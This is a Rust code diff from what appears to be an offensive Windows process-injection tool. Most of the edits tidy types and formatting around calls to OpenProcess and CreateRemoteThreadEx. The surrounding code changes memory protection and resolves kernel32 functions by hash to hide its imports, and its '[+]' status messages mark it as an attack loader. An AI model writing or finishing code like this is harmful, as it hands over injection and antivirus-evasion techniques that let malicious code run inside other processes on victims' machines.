@@ -18,7 +18,7 @@ use windows::{
     },
     core::{PCSTR, Result},
 };
-use std::{ptr::{self, null_mut, null}, process, mem, str, slice, os::raw::c_void, option::Option};
+use std::{ptr::{self, null_mut, null}, process, mem, str, slice, os::raw::c_void};
 
 type TOpenProcess = unsafe extern "system" fn(
     dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
@@ -65,7 +65,7 @@ type TCreateRemoteThreadEx = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpthreadattributes: *const SECURITY_ATTRIBUTES,
     dwstacksize: usize,
-    lpstartaddress: LPTHREAD_START_ROUTINE,
+    lpstartaddress: *mut c_void,
     lpparameter: *const c_void,
     dwcreationflags: u32,
     lpattributelist: *mut c_void,
@@ -253,7 +253,7 @@ fn main() {
             &mut oldprotect,
         );
         
-        println!("[+] Creating a Remote Thread");
+        println!("\n[+] Creating a Remote Thread");
         let XCreateRemoteThreadEx: TCreateRemoteThreadEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x857934) as *const u32);
         
         //println!("Last Error : {:?}", GetLastError());
@@ -262,11 +262,12 @@ fn main() {
             hprocess,
             null(),
             0,
-            std::mem::transmute(haddr),
+            haddr,
             null(),
             0,
             null_mut(),
-            null_mut(),); */
+            null_mut(),
+        ); */
         
         let hthread = CreateRemoteThreadEx(
             hprocess,
